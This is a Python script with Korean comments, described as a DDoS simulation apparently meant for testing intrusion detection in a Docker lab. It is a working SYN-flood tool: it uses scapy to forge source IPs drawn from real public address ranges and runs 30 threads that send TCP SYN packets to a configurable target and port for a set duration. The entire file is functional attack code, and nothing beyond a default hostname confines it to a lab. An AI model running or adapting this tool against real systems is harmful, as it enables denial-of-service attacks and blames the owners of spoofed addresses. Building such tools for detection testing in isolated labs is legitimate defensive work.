#!/usr/bin/env python3
"""30개 위조 IP DDoS 시뮬레이션.

scapy로 src_ip를 스푸핑하여 30명의 공격자가 동시에 SYN 패킷을 전송하는
것처럼 시뮬레이션한다. 각 위조 IP는 고유하게 생성되므로 NIDS에서
다수의 공격자처럼 인식된다.

요구사항:
    - Docker cap_add: NET_RAW  (raw socket 권한)
    - scapy 설치 필요

실행:
    python3 /ddos_simulate.py
    python3 /ddos_simulate.py --target apache_server --duration 30 --attackers 30
"""
from __future__ import annotations

import argparse
import random
import sys
import threading
import time
from typing import List

from scapy.all import IP, TCP, conf, send

conf.verb = 0  # scapy 전역 출력 억제

# ── 위조 IP 접두사 풀 ──────────────────────────────────────────────────
_IP_PREFIXES = [
    "61.{}.{}.{}",    # 한국 KT
    "175.{}.{}.{}",   # 한국 SKT
    "210.{}.{}.{}",   # 일본/아시아
    "117.{}.{}.{}",   # 중국/아시아
    "45.{}.{}.{}",    # 유럽
    "92.{}.{}.{}",    # 유럽
    "104.{}.{}.{}",   # 미국
    "54.{}.{}.{}",    # 미국 AWS
]


def get_random_ip() -> str:
    """사설 IP 대역 제외, 공인 IP처럼 보이는 랜덤 주소 생성."""
    prefix = random.choice(_IP_PREFIXES)
    return prefix.format(
        random.randint(1, 254),
        random.randint(0, 255),
        random.randint(1, 254),
    )


def _generate_attacker_ips(n: int) -> List[str]:
    """n개의 고유 위조 IP 목록 생성."""
    ips: set = set()
    while len(ips) < n:
        ips.add(get_random_ip())
    return list(ips)


# ── 공유 카운터 (thread-safe) ──────────────────────────────────────────
_lock   = threading.Lock()
_sent   = 0
_errors = 0


def _worker(
    src_ip: str,
    target_ip: str,
    target_port: int,
    stop_event: threading.Event,
) -> None:
    """단일 위조 공격자 스레드. stop_event 까지 SYN 패킷 전송."""
    global _sent, _errors
    while not stop_event.is_set():
        try:
            sport = random.randint(1024, 65535)
            pkt   = IP(src=src_ip, dst=target_ip) / TCP(
                sport=sport,
                dport=target_port,
                flags="S",
                seq=random.randint(0, 2**32 - 1),
            )
            send(pkt, verbose=0)
            with _lock:
                _sent += 1
        except Exception:
            with _lock:
                _errors += 1
        # 0.01초 딜레이 — 너무 빠른 전송으로 컨테이너 부하 방지
        time.sleep(0.01)


def run_ddos(
    target: str,
    port: int,
    n_attackers: int,
    duration: int,
) -> None:
    print(f"[DDoS] 대상          : {target}:{port}")
    print(f"[DDoS] 위조 공격자   : {n_attackers}명")
    print(f"[DDoS] 지속 시간     : {duration}초")

    attacker_ips = _generate_attacker_ips(n_attackers)
    print(f"[DDoS] 위조 IP 샘플  : {attacker_ips[:5]} ...")

    stop_event = threading.Event()
    threads: List[threading.Thread] = []

    for src_ip in attacker_ips:
        t = threading.Thread(
            target=_worker,
            args=(src_ip, target, port, stop_event),
            daemon=True,
        )
        threads.append(t)
        t.start()

    print(f"[DDoS] {n_attackers}개 스레드 시작\n")

    # 10초마다 진행 현황 출력
    start_ts  = time.time()
    next_tick = 10.0

    while True:
        elapsed = time.time() - start_ts
        if elapsed >= duration:
            break
        if elapsed >= next_tick:
            with _lock:
                s = _sent
            print(f"[DDoS] {elapsed:5.0f}s 경과 | 전송: {s:,} 패킷")
            next_tick += 10.0
        time.sleep(0.5)

    stop_event.set()
    for t in threads:
        t.join(timeout=3)

    elapsed = time.time() - start_ts
    with _lock:
        s = _sent
        e = _errors

    pps = s / elapsed if elapsed > 0 else 0.0

    print(f"\n=== DDoS 시뮬레이션 완료 ===")
    print(f"  위조 공격자  : {n_attackers}명")
    print(f"  지속 시간    : {elapsed:.1f}초")
    print(f"  전송 패킷    : {s:,}개")
    print(f"  초당 패킷    : {pps:.0f} pps")
    print(f"  오류         : {e:,}건")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="30개 위조 IP DDoS 시뮬레이션 (scapy SYN 스푸핑)"
    )
    parser.add_argument(
        "--target", default="apache_server",
        metavar="HOST",
        help="대상 호스트 (기본: apache_server)",
    )
    parser.add_argument(
        "--port", type=int, default=80,
        metavar="N",
        help="대상 포트 (기본: 80)",
    )
    parser.add_argument(
        "--attackers", type=int, default=30,
        metavar="N",
        help="위조 공격자 수 (기본: 30)",
    )
    parser.add_argument(
        "--duration", type=int, default=30,
        metavar="N",
        help="공격 지속 시간 초 (기본: 30)",
    )
    args = parser.parse_args()

    run_ddos(
        target=args.target,
        port=args.port,
        n_attackers=args.attackers,
        duration=args.duration,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
